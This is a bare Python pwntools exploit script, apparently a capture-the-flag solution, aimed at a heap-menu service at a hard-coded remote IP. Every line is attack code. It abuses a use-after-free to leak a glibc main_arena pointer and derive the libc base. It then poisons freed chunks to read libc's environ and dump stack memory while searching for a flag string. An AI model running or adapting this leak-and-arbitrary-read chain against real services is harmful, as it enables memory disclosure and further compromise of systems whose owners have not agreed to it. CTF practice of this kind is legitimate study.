from pwn import *
context(os='linux',arch='amd64')
main_arena_offset=0x203ac0# glibc 2.39 here
environ_offset=0x20ad58
p=remote("13.206.57.188",10039)
def add(idx,size):
    p.sendlineafter("command:\n","C "+str(idx)+" "+str(size))
def read(idx):
    p.sendlineafter("command:\n","R "+str(idx))
    return p.recvline()
def free(idx):
    p.sendlineafter("command:\n","D "+str(idx))
def write(idx,offset,payload):
    p.sendlineafter("command:\n","W "+str(idx)+" "+str(offset)+" "+str(len(payload)+1))
    p.sendline(payload)
  
add(0,0x500)
add(1,0x500)
free(0)
add(2,0x500)
main_arena=u64(read(0)[:8])-0x60
libc=main_arena-main_arena_offset
print("libc=",hex(libc))
            

environ_addr =libc+environ_offset   
add(3,40)
add(4,40)
free(3)
free(4)
add(5,24)
write(5,0,p64(environ_addr)+p64(8))
stack_addr=u64((read(3)[:8]))
print("stack_addr=",hex(stack_addr))
add(6,40)
add(7,40)
free(6)
free(7)
add(8,24)
write(8,0,p64(stack_addr-0x400)+p64(1024))
s=read(6)
print(s)
idx=s.find(b'athena')
print(idx,s[idx:])
